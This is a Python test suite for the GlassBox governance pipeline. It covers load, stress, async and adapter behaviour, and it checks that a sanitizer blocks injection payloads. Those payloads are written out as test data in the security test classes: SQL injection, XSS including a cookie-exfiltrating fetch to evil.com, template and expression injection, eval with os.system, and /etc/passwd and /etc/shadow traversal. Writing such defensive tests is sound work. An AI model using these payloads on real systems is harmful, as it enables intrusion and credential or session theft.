"""
GlassBox — Load, Stress & Security Test Suite  (v1.0.0)
Comprehensive testing covering:
  - Load testing (sustained throughput)
  - Stress testing (beyond design capacity)
  - Spike testing (sudden burst)
  - Security injection testing (SQL, script, null byte, path traversal)
  - Multi-instance isolation testing
  - Memory pressure testing
  - Async pipeline testing
  - Platform adapter testing

Run:  python3 tests/test_load_stress_security.py
Or:   python3 -m unittest tests.test_load_stress_security -v

Author: Mohammed Akbar Ansari
"""

from __future__ import annotations

import asyncio
import gc
import os
import sys
import threading
import time
import unittest
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List

# Ensure project root is on sys.path
_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from glassbox.governance.audit_logger    import AuditLogger
from glassbox.governance.models          import (
    AgentContract, DecisionContext, DecisionRequest, DecisionType,
    FinalStatus, RetryConfig, RetryStrategy,
)
from glassbox.governance.pipeline        import GovernancePipeline
from glassbox.governance.policy_engine   import PolicyEngine
from glassbox.governance.velocity_breaker import VelocityBreaker
from glassbox.security.sanitizer         import (
    PayloadSanitizer, SecurityReport, validate_agent_id,
)


# ── Helpers ───────────────────────────────────────────────────────────────────

def _pipe(**kwargs) -> GovernancePipeline:
    return GovernancePipeline(echo=False, **kwargs)


def _proc(agent="load_agent", amount=5000):
    return DecisionRequest(
        agent_id=agent,
        decision_type=DecisionType.PROCUREMENT,
        payload={"amount": amount, "supplier_id": "SUP-001", "category": "hardware"},
    )


# ══════════════════════════════════════════════════════════════════════════════
# SECURITY INJECTION TESTS
# ══════════════════════════════════════════════════════════════════════════════

class TestSecuritySQLInjection(unittest.TestCase):
    """Validate that SQL injection payloads are detected and blocked."""

    def setUp(self):
        self.san = PayloadSanitizer(block_on_sql=True)

    def _is_blocked(self, payload):
        return self.san.check(payload).blocked

    def test_classic_or_injection(self):
        self.assertTrue(self._is_blocked({"supplier_id": "' OR 1=1 --"}))

    def test_union_select(self):
        self.assertTrue(self._is_blocked({"category": "hardware UNION SELECT * FROM users"}))

    def test_drop_table(self):
        self.assertTrue(self._is_blocked({"reference": "REF; DROP TABLE decisions;"}))

    def test_sleep_injection(self):
        self.assertTrue(self._is_blocked({"product_id": "P1'; WAITFOR DELAY '0:0:5'--"}))

    def test_xp_cmdshell(self):
        self.assertTrue(self._is_blocked({"action": "restart; xp_cmdshell('dir')"}))

    def test_blind_injection_boolean(self):
        self.assertTrue(self._is_blocked({"agent_id": "agent' AND 1=1--"}))

    def test_clean_payload_not_blocked(self):
        self.assertFalse(self._is_blocked({"amount": 5000, "supplier_id": "SUP-001"}))

    def test_normal_string_not_blocked(self):
        self.assertFalse(self._is_blocked({"description": "Quarterly hardware procurement"}))


class TestSecurityScriptInjection(unittest.TestCase):
    """Validate that script/template/command injection payloads are blocked."""

    def setUp(self):
        self.san = PayloadSanitizer(block_on_script=True)

    def _is_blocked(self, payload):
        return self.san.check(payload).blocked

    def test_xss_script_tag(self):
        self.assertTrue(self._is_blocked({"description": "<script>alert('xss')</script>"}))

    def test_javascript_url(self):
        self.assertTrue(self._is_blocked({"url": "javascript:void(0)"}))

    def test_jinja_ssti(self):
        self.assertTrue(self._is_blocked({"template": "{{7*7}}"}))

    def test_el_injection(self):
        self.assertTrue(self._is_blocked({"expr": "${Runtime.exec('id')}"}))

    def test_python_eval(self):
        self.assertTrue(self._is_blocked({"code": "eval('__import__(os).system(id)')"}))

    def test_path_traversal(self):
        self.assertTrue(self._is_blocked({"path": "../../etc/passwd"}))

    def test_null_byte(self):
        self.assertTrue(self._is_blocked({"name": "agent\x00admin"}))

    def test_blocked_keyword_passwd(self):
        self.assertTrue(self._is_blocked({"note": "/etc/passwd contents"}))

    def test_clean_description_not_blocked(self):
        self.assertFalse(self._is_blocked({"note": "Standard procurement order Q4 2026"}))


class TestSecurityPipelineIntegration(unittest.TestCase):
    """Validate that injection payloads are blocked at the pipeline level."""

    def setUp(self):
        self.p = _pipe()

    def test_sql_injection_blocked_at_pipeline(self):
        r = self.p.process(DecisionRequest(
            "agent_sec", DecisionType.PROCUREMENT,
            {"amount": 1000, "supplier_id": "SUP-001'; DROP TABLE suppliers;--",
             "category": "hardware"},
        ))
        self.assertEqual(r.final_status, FinalStatus.BLOCKED)
        self.assertTrue(any("SECURITY-001" in v for v in r.policy_violations))

    def test_script_injection_blocked_at_pipeline(self):
        r = self.p.process(DecisionRequest(
            "agent_sec", DecisionType.CUSTOM,
            {"description": "<script>fetch('https://evil.com?c='+document.cookie)</script>"},
        ))
        self.assertEqual(r.final_status, FinalStatus.BLOCKED)

    def test_null_byte_in_agent_id_blocked(self):
        r = self.p.process(DecisionRequest(
            "agent\x00admin", DecisionType.PROCUREMENT,
            {"amount": 1000},
        ))
        self.assertEqual(r.final_status, FinalStatus.BLOCKED)
        self.assertTrue(any("SECURITY-001" in v for v in r.policy_violations))

    def test_invalid_agent_id_blocked(self):
        r = self.p.process(DecisionRequest(
            "../../../etc/passwd", DecisionType.PROCUREMENT,
            {"amount": 1000},
        ))
        self.assertEqual(r.final_status, FinalStatus.BLOCKED)

    def test_path_traversal_in_payload_blocked(self):
        r = self.p.process(DecisionRequest(
            "agent_sec", DecisionType.IT_OPS,
            {"action": "read_file", "target": "../../../../etc/shadow"},
        ))
        self.assertEqual(r.final_status, FinalStatus.BLOCKED)

    def test_clean_payload_not_affected_by_security(self):
        r = self.p.process(DecisionRequest(
            "agent_clean", DecisionType.PROCUREMENT,
            {"amount": 5000, "supplier_id": "SUP-001", "category": "hardware"},
        ))
        self.assertEqual(r.final_status, FinalStatus.EXECUTED)

    def test_oversized_payload_flagged(self):
        san = PayloadSanitizer(max_payload_size=100)
        p   = _pipe(sanitizer=san)
        big_payload = {"data": "x" * 200, "amount": 1000}
        report = san.check(big_payload)
        # Size finding should be present
        self.assertTrue(any(f.category == "size" for f in report.findings))


class TestAgentIdValidation(unittest.TestCase):
    """Validate agent ID safety constraints."""

    def test_valid_agent_id(self):
        ok, err = validate_agent_id("procurement_agent_001")
        self.assertTrue(ok)
        self.assertIsNone(err)

    def test_empty_agent_id(self):
        ok, err = validate_agent_id("")
        self.assertFalse(ok)

    def test_too_long_agent_id(self):
        ok, err = validate_agent_id("a" * 200)
        self.assertFalse(ok)

    def test_path_traversal_in_agent_id(self):
        ok, err = validate_agent_id("../../etc/passwd")
        self.assertFalse(ok)

    def test_script_in_agent_id(self):
        ok, err = validate_agent_id("<script>alert(1)</script>")
        self.assertFalse(ok)

    def test_semicolon_in_agent_id(self):
        ok, err = validate_agent_id("agent;DROP TABLE")
        self.assertFalse(ok)

    def test_valid_ids_with_special_chars(self):
        for aid in ["agent-001", "agent.service", "agent@domain:8080"]:
            ok, _ = validate_agent_id(aid)
            self.assertTrue(ok, f"Should accept: {aid}")


# ══════════════════════════════════════════════════════════════════════════════
# LOAD TESTS — Sustained throughput
# ══════════════════════════════════════════════════════════════════════════════

class TestLoadSustained(unittest.TestCase):
    """Sustained load: verify stable throughput and zero errors over time."""

    def test_1000_decisions_zero_errors(self):
        p = _pipe(max_memory_records=2000)
        errors = []
        for i in range(1000):
            try:
                p.process(_proc(f"load_{i % 10}", 500 * (i % 20 + 1)))
            except Exception as exc:
                errors.append(str(exc))
        self.assertEqual(len(errors), 0)
        self.assertEqual(p.stats["total"], 1000)

    def test_all_decision_types_no_errors(self):
        p = _pipe()
        cases = [
            (DecisionType.PROCUREMENT, {"amount": 5000, "supplier_id": "SUP-001", "category": "hw"}),
            (DecisionType.PRICING,     {"new_price": 110.0, "previous_price": 100.0, "product_id": "P1"}),
            (DecisionType.FINANCIAL,   {"amount": 15000, "destination_account": "ACC", "reference": "R1"}),
            (DecisionType.INVENTORY,   {"quantity": 500, "product_id": "SKU-001"}),
            (DecisionType.LOGISTICS,   {"origin": "MUM", "destination": "DEL", "shipment_value": 5000}),
            (DecisionType.IT_OPS,      {"action": "restart_service", "target": "svc"}),
            (DecisionType.HR,          {"action": "address_update", "employee_id": "EMP-001"}),
            (DecisionType.CUSTOM,      {"description": "load test decision"}),
        ]
        errors = []
        for _ in range(100):
            for dtype, payload in cases:
                try:
                    p.process(DecisionRequest("load_mixed", dtype, payload))
                except Exception as exc:
                    errors.append(str(exc))
        self.assertEqual(len(errors), 0)

    def test_avg_latency_under_sla_5ms(self):
        p = _pipe()
        for _ in range(200):
            p.process(_proc())
        s = p.stats
        self.assertIsNotNone(s["avg_latency_ms"])
        self.assertLess(s["avg_latency_ms"], 5.0, f"Avg latency SLA breach: {s['avg_latency_ms']}ms")

    def test_p99_latency_under_sla_50ms(self):
        p = _pipe()
        for _ in range(500):
            p.process(_proc())
        s = p.stats
        if s.get("p99_latency_ms"):
            self.assertLess(s["p99_latency_ms"], 50.0, f"P99 SLA breach: {s['p99_latency_ms']}ms")


# ══════════════════════════════════════════════════════════════════════════════
# STRESS TESTS — Beyond design capacity, verify graceful degradation
# ══════════════════════════════════════════════════════════════════════════════

class TestStress(unittest.TestCase):
    """Stress: verify no crashes, no data corruption under extreme load."""

    def test_100_thread_stress_no_errors(self):
        p   = _pipe(max_memory_records=20000)
        errors = []
        lock   = threading.Lock()
        ids    = []

        def worker(tid):
            for i in range(50):
                try:
                    r = p.process(_proc(f"stress_{tid}", 1000))
                    with lock:
                        ids.append(r.decision_id)
                except Exception as exc:
                    with lock:
                        errors.append(str(exc))

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(100)]
        for t in threads: t.start()
        for t in threads: t.join()

        self.assertEqual(len(errors), 0, f"Stress errors: {errors[:5]}")
        self.assertEqual(len(set(ids)), len(ids), "Duplicate decision IDs under stress!")
        total = p.stats["total"]
        self.assertGreaterEqual(total, 4000, f"Expected >=4000 decisions, got {total}")

    def test_velocity_breaker_under_stress(self):
        """Under stress, velocity breaker must never let a trip go undetected."""
        vb = VelocityBreaker(max_decisions=10, window_seconds=60, cooldown_seconds=0)
        p  = _pipe(velocity_breaker=vb)
        results = []
        lock = threading.Lock()

        def burst(tid):
            for _ in range(15):   # 15 > 10 limit
                r = p.process(_proc(f"stress_vel_{tid}", 500))
                with lock:
                    results.append(r.final_status)

        threads = [threading.Thread(target=burst, args=(i,)) for i in range(5)]
        for t in threads: t.start()
        for t in threads: t.join()

        # At least some decisions must have been blocked per-agent
        blocked = sum(1 for s in results if s == FinalStatus.BLOCKED)
        self.assertGreater(blocked, 0, "Expected some velocity blocks under stress")

    def test_audit_logger_bounded_memory(self):
        """Ring buffer must not exceed max_memory_records."""
        max_records = 100
        p = _pipe(max_memory_records=max_records)
        for i in range(max_records * 3):
            p.process(_proc(f"mem_{i % 5}", 500))
        actual = len(p.audit_logger.get_all())
        self.assertLessEqual(actual, max_records,
            f"Memory ring buffer overflow: {actual} > {max_records}")

    def test_policy_engine_concurrent_register_and_evaluate(self):
        """Concurrent register+evaluate must never crash the policy engine."""
        from glassbox.governance.models import PolicyEvaluation
        from glassbox.governance.policy_engine import Policy, PolicyEngine

        pe = PolicyEngine()
        errors = []
        lock = threading.Lock()

        def register_custom(i):
            try:
                def rule(p, ctx):
                    return PolicyEvaluation(f"CUSTOM-{i}", f"Custom {i}", "pass", "ok")
                pe.register(Policy(f"CUSTOM-{i}", f"Custom {i}",
                                   [DecisionType.CUSTOM], rule))
            except Exception as exc:
                with lock:
                    errors.append(str(exc))

        def evaluate_batch():
            try:
                ctx = DecisionContext()
                for _ in range(20):
                    pe.evaluate(DecisionType.CUSTOM, {"description": "test"}, ctx)
            except Exception as exc:
                with lock:
                    errors.append(str(exc))

        threads = (
            [threading.Thread(target=register_custom, args=(i,)) for i in range(20)] +
            [threading.Thread(target=evaluate_batch) for _ in range(10)]
        )
        for t in threads: t.start()
        for t in threads: t.join()
        self.assertEqual(len(errors), 0, f"Policy engine concurrent errors: {errors}")

    def test_multi_instance_isolation(self):
        """Multiple pipeline instances must be fully isolated — no shared state."""
        p1 = _pipe()
        p2 = _pipe()

        # Block PROC-001 on p1 only
        p1.policy_engine.disable("PROC-001")

        r1 = p1.process(DecisionRequest("a1", DecisionType.PROCUREMENT,
            {"amount": 700000, "supplier_id": "SUP-001", "category": "hardware"}))
        r2 = p2.process(DecisionRequest("a1", DecisionType.PROCUREMENT,
            {"amount": 700000, "supplier_id": "SUP-001", "category": "hardware"}))

        # p2 must still enforce PROC-001 — p1's disable must not affect p2
        self.assertEqual(r1.final_status, FinalStatus.EXECUTED,
            "p1 should execute (PROC-001 disabled)")
        self.assertEqual(r2.final_status, FinalStatus.BLOCKED,
            "p2 must block (PROC-001 still active) — instance isolation breach!")

    def test_no_shared_policy_state_between_instances(self):
        """Deep-copy in PolicyEngine must prevent cross-instance mutation."""
        from glassbox.governance.policy_engine import PolicyEngine
        pe1 = PolicyEngine()
        pe2 = PolicyEngine()
        pe1.disable("PROC-001")
        # pe2 must still have PROC-001 enabled
        enabled = [p.enabled for p in pe2.policies if p.policy_id == "PROC-001"]
        self.assertTrue(all(enabled), "PROC-001 disabled on pe1 leaked to pe2!")


# ══════════════════════════════════════════════════════════════════════════════
# SPIKE TESTS — Sudden burst
# ══════════════════════════════════════════════════════════════════════════════

class TestSpike(unittest.TestCase):
    """Spike: verify that sudden burst traffic is handled without crashing."""

    def test_burst_500_simultaneous_threads(self):
        """500 simultaneous threads submitting one decision each."""
        p      = _pipe(max_memory_records=1000, async_workers=32)
        errors = []
        lock   = threading.Lock()

        def submit(i):
            try:
                p.process(_proc(f"spike_{i}", 100 + i))
            except Exception as exc:
                with lock:
                    errors.append(str(exc))

        with ThreadPoolExecutor(max_workers=500) as pool:
            futs = [pool.submit(submit, i) for i in range(500)]
            for f in as_completed(futs):
                f.result()  # re-raise any exception

        self.assertEqual(len(errors), 0, f"Spike errors: {errors[:5]}")

    def test_burst_then_normal_throughput_restored(self):
        """After a velocity burst, normal traffic resumes after per-agent reset."""
        vb = VelocityBreaker(max_decisions=5, window_seconds=60, cooldown_seconds=0)
        p  = _pipe(velocity_breaker=vb)
        for _ in range(7):
            p.process(_proc("spike_agent"))
        vb.reset("spike_agent")
        r = p.process(_proc("spike_agent"))
        self.assertFalse(r.circuit_breaker_triggered,
            "After reset, normal traffic must flow again")


# ══════════════════════════════════════════════════════════════════════════════
# ASYNC PIPELINE TESTS
# ══════════════════════════════════════════════════════════════════════════════

class TestAsyncPipeline(unittest.TestCase):
    """Validate that process_async() is safe and produces correct results."""

    def test_async_single_decision(self):
        p = _pipe()
        async def go():
            return await p.process_async(_proc())
        r = asyncio.run(go())
        self.assertIsNotNone(r.final_status)
        self.assertEqual(r.final_status, FinalStatus.EXECUTED)

    def test_async_concurrent_50_decisions(self):
        p = _pipe()
        async def go():
            tasks = [p.process_async(_proc(f"async_{i}")) for i in range(50)]
            return await asyncio.gather(*tasks)
        results = asyncio.run(go())
        self.assertEqual(len(results), 50)
        ids = [r.decision_id for r in results]
        self.assertEqual(len(set(ids)), 50, "Async: duplicate decision IDs!")

    def test_async_blocked_decision(self):
        p = _pipe()
        async def go():
            return await p.process_async(DecisionRequest(
                "async_block", DecisionType.PROCUREMENT,
                {"amount": 700000, "category": "hardware"}
            ))
        r = asyncio.run(go())
        self.assertEqual(r.final_status, FinalStatus.BLOCKED)

    def test_async_security_injection_blocked(self):
        p = _pipe()
        async def go():
            return await p.process_async(DecisionRequest(
                "async_sec", DecisionType.CUSTOM,
                {"description": "{{7*7}} SSTI injection test"}
            ))
        r = asyncio.run(go())
        self.assertEqual(r.final_status, FinalStatus.BLOCKED)

    def test_async_does_not_block_event_loop(self):
        """process_async must not block the event loop."""
        p = _pipe()
        results = []

        async def go():
            tasks = []
            for i in range(20):
                tasks.append(p.process_async(_proc(f"el_{i}")))
            # Run a counter task alongside — it must complete without starvation
            async def counter():
                count = 0
                for _ in range(100):
                    await asyncio.sleep(0)
                    count += 1
                return count

            all_tasks = tasks + [counter()]
            all_results = await asyncio.gather(*all_tasks)
            results.extend(all_results)

        asyncio.run(go())
        # Last result is counter — should have reached 100
        self.assertEqual(results[-1], 100, "Event loop was blocked by async pipeline!")

    def test_async_shutdown(self):
        p = _pipe()
        # Drain and shutdown — must not raise
        try:
            p.shutdown()
        except Exception as exc:
            self.fail(f"shutdown() raised: {exc}")


# ══════════════════════════════════════════════════════════════════════════════
# PLATFORM ADAPTER TESTS
# ══════════════════════════════════════════════════════════════════════════════

class TestPlatformAdapters(unittest.TestCase):
    """Validate platform adapters create correct configurations."""

    def test_base_adapter_creates_pipeline(self):
        from glassbox.adapters.platforms import BaseAdapter
        adapter  = BaseAdapter()
        pipeline = adapter.create_pipeline()
        self.assertIsNotNone(pipeline)
        r = pipeline.process(_proc())
        self.assertIsNotNone(r.final_status)

    def test_databricks_adapter_config(self):
        from glassbox.adapters.platforms import DatabricksAdapter
        adapter = DatabricksAdapter()
        cfg     = adapter.get_config()
        self.assertIn("log_dir", cfg)
        self.assertIn("environment", cfg)

    def test_kubernetes_adapter_config(self):
        from glassbox.adapters.platforms import KubernetesAdapter
        adapter = KubernetesAdapter()
        cfg     = adapter.get_config()
        self.assertEqual(cfg["log_dir"], "/var/log/glassbox")

    def test_fabric_adapter_config(self):
        from glassbox.adapters.platforms import FabricAdapter
        adapter = FabricAdapter()
        cfg     = adapter.get_config()
        self.assertIn("log_dir", cfg)

    def test_auto_detect_returns_adapter(self):
        from glassbox.adapters.platforms import auto_detect_adapter
        adapter = auto_detect_adapter()
        self.assertIsNotNone(adapter)
        pipeline = adapter.create_pipeline()
        r = pipeline.process(_proc())
        self.assertIsNotNone(r.final_status)

    def test_kubernetes_readiness_check(self):
        from glassbox.adapters.platforms import KubernetesAdapter
        adapter  = KubernetesAdapter()
        pipeline = adapter.create_pipeline()
        check    = adapter.readiness_check(pipeline)
        self.assertIn("ready", check)
        self.assertTrue(check["ready"])

    def test_kubernetes_liveness_check(self):
        from glassbox.adapters.platforms import KubernetesAdapter
        check = KubernetesAdapter().liveness_check()
        self.assertTrue(check["alive"])


# ══════════════════════════════════════════════════════════════════════════════
# MEMORY PRESSURE TESTS
# ══════════════════════════════════════════════════════════════════════════════

class TestMemoryPressure(unittest.TestCase):
    """Validate that bounded ring buffer prevents memory exhaustion."""

    def test_ring_buffer_evicts_oldest_when_full(self):
        max_records = 50
        p = _pipe(max_memory_records=max_records)
        first_id = None
        for i in range(max_records * 2):
            r = p.process(_proc(f"mem_{i % 5}"))
            if i == 0:
                first_id = r.decision_id

        records = p.audit_logger.get_all()
        self.assertLessEqual(len(records), max_records)
        # First record should have been evicted
        self.assertIsNone(p.audit_logger.get_by_id(first_id),
            "Oldest record should be evicted from ring buffer when full")

    def test_gc_after_large_run(self):
        """Pipeline must not retain hard references after decisions are evicted."""
        p = _pipe(max_memory_records=100)
        for i in range(500):
            p.process(_proc())
        gc.collect()
        # If we reach here without OOM, memory management is working
        self.assertLessEqual(len(p.audit_logger.get_all()), 100)


# ══════════════════════════════════════════════════════════════════════════════
# FILE I/O THREAD SAFETY
# ══════════════════════════════════════════════════════════════════════════════

class TestAuditLoggerFileSafety(unittest.TestCase):
    """Validate concurrent file writes don't corrupt JSONL output."""

    def test_concurrent_file_writes_produce_valid_jsonl(self):
        import json
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            p = GovernancePipeline(echo=False, log_dir=tmpdir,
                                   max_memory_records=500)
            errors = []
            lock   = threading.Lock()

            def write_batch(tid):
                for i in range(20):
                    try:
                        p.process(_proc(f"file_{tid}", 500 + i))
                    except Exception as exc:
                        with lock:
                            errors.append(str(exc))

            threads = [threading.Thread(target=write_batch, args=(i,))
                       for i in range(10)]
            for t in threads: t.start()
            for t in threads: t.join()

            self.assertEqual(len(errors), 0)

            # Validate all JSONL lines are parseable
            from pathlib import Path
            jsonl_files = list(Path(tmpdir).glob("*.jsonl"))
            self.assertGreater(len(jsonl_files), 0, "No JSONL files created")
            bad_lines = 0
            total_lines = 0
            for fp in jsonl_files:
                for line in fp.read_text().strip().splitlines():
                    total_lines += 1
                    try:
                        json.loads(line)
                    except json.JSONDecodeError:
                        bad_lines += 1
            self.assertEqual(bad_lines, 0,
                f"{bad_lines} of {total_lines} JSONL lines are invalid JSON — concurrent write corruption!")
            self.assertGreaterEqual(total_lines, 150)


# ══════════════════════════════════════════════════════════════════════════════
# HEALTH CHECK
# ══════════════════════════════════════════════════════════════════════════════

class TestHealthCheck(unittest.TestCase):
    def test_health_returns_correct_structure(self):
        p = _pipe()
        p.process(_proc())
        h = p.health()
        for key in ["status", "service", "version", "environment",
                    "total_decisions", "block_rate_pct", "policies"]:
            self.assertIn(key, h, f"Missing health key: {key}")
        self.assertEqual(h["status"], "healthy")
        self.assertEqual(h["total_decisions"], 1)


# ══════════════════════════════════════════════════════════════════════════════
# Runner
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    loader = unittest.TestLoader()
    suite  = unittest.TestSuite()
    classes = [
        TestSecuritySQLInjection,
        TestSecurityScriptInjection,
        TestSecurityPipelineIntegration,
        TestAgentIdValidation,
        TestLoadSustained,
        TestStress,
        TestSpike,
        TestAsyncPipeline,
        TestPlatformAdapters,
        TestMemoryPressure,
        TestAuditLoggerFileSafety,
        TestHealthCheck,
    ]
    for cls in classes:
        suite.addTests(loader.loadTestsFromTestCase(cls))

    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    sys.exit(0 if result.wasSuccessful() else 1)
